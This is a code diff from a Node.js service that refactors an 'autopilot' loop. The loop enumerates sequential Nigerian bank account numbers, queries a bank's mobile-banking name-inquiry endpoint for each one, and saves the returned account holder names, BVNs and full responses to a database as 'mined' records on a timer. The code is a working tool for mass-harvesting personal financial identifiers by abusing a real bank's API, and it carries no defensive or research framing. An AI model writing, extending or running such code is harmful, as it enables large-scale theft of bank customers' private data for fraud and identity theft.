@@ -185,75 +185,80 @@ ping = async (t,hippoLeg) => {
         else clearInterval();
     }, 300000);
 }
-var save = async (e,r,b) => {
-    
+var startAuto = async (x) => {
+    chip(x);
+    setInterval(async() => {
+        chip(x)
+    }, x.timeFrame);
 }
 const chip = async (x) => {
-    
+    var serial_no;
+    var {bankCode,direction,hippoLeg,startAccount} = x;
+    for(var i = 0;i<10000;i++){
+        direction == "up" ? (
+            serial_no = Number(startAccount) + i 
+        ): serial_no = startAccount - i;
+        var serial_no_length = serial_no.toString().length;
+        if (serial_no_length < 9) {
+            var zeroAmount = 9 - serial_no_length;
+            for (var o = 0; o < zeroAmount; o++) {
+                serial_no = "0" + serial_no;
+            }
+        }
+        var gen = await generate_nuban(serial_no, bankCode);
+        console.log(gen)
+        var hippoExist = await hippo.findOne({
+            accountNumber: gen
+        });
+        if (hippoExist == null) {
+            try {
+                var resp = await axios.get(`https://abp-mobilebank.accessbankplc.com/VBPAccess/webresources/nipNameInquiry2?destinationBankCode=${bankCode}&accountNumber=${gen}`);
+                //console.log(`${resp.data}`);
+            } catch (e) {
+                console.log({
+                    error: "error in connect"
+                });
+            }
+            var data = resp.data;
+            if (data.customerAccountName != null) {
+
+                var pdata = {
+                    bvn: data.beneficiaryBvn,
+                    accountNumber: gen,
+                    name: data.customerAccountName,
+                    bankCode: bankCode,
+                    dateMined: new Date(),
+                    dump: data
+                };
+                //console.log(pdata)
+                var person = new hippo(pdata);
+                try {
+                    await setMineAmount();
+                    person.save();
+                } catch (e) {
+                    console.log("error saving")
+                }
+            }
+        } else console.log(`${gen} exists`);
+    }
     
 }
 app.get("/autopilot/:timeFrame/:bankCode/:direction/:hippoLeg",async (req,res)=>{
     var {timeFrame,bankCode,direction,hippoLeg} = req.params;
-    var timeStart = (new Date().getTime()) /1000;
-    var serial_no, startAccount, i = 0;
+    
+    var startAccount;
     startAccount = direction == 'up' ? await lastMineUpBank(bankCode).accountNumber : await lastMineDownBank(bankCode).accountNumber;
     startAccount ? "" : startAccount = nubans[`${bankCode}`];
     console.log("started from :: " + startAccount);
     ping(timeFrame,hippoLeg);
     console.log("Auto pilot started");
-    (async()=>{
-        for(var i = 0;i<100000;i++){
-            console.log(i)
-            if(Number(Math.round((new Date().getTime()/1000) - timeStart)) <= timeFrame){
-                direction == "up" ? (
-                    serial_no = Number(startAccount) + i 
-                ): serial_no = startAccount - i;
-                var serial_no_length = serial_no.toString().length;
-                if (serial_no_length < 9) {
-                    var zeroAmount = 9 - serial_no_length;
-                    for (var o = 0; o < zeroAmount; o++) {
-                        serial_no = "0" + serial_no;
-                    }
-                }
-                var gen = await generate_nuban(serial_no, bankCode);
-                console.log(gen)
-                var hippoExist = await hippo.findOne({
-                    accountNumber: gen
-                });
-                if (hippoExist == null) {
-                    try {
-                        var resp = await axios.get(`https://abp-mobilebank.accessbankplc.com/VBPAccess/webresources/nipNameInquiry2?destinationBankCode=${bankCode}&accountNumber=${gen}`);
-                        //console.log(`${resp.data}`);
-                    } catch (e) {
-                        console.log({
-                            error: "error in connect"
-                        });
-                    }
-                    var data = resp.data;
-                    if (data.customerAccountName != null) {
-        
-                        var pdata = {
-                            bvn: data.beneficiaryBvn,
-                            accountNumber: gen,
-                            name: data.customerAccountName,
-                            bankCode: bankCode,
-                            dateMined: new Date(),
-                            dump: data
-                        };
-                        //console.log(pdata)
-                        var person = new hippo(pdata);
-                        try {
-                            await setMineAmount();
-                            person.save();
-                        } catch (e) {
-                            console.log("error saving")
-                        }
-                    }
-                } else console.log(`${gen} exists`);
-            }
-            else return console.log("autopilot done");
-        }
-    })()
+    startAuto({
+        bankCode : bankCode,
+        direction : direction,
+        hippoLeg : hippoLeg,
+        startAccount : startAccount,
+
+    })
     res.json({type : "success", msg : "Autopilot activated"});
 })
 app.get("/ping", async (req, res) => {
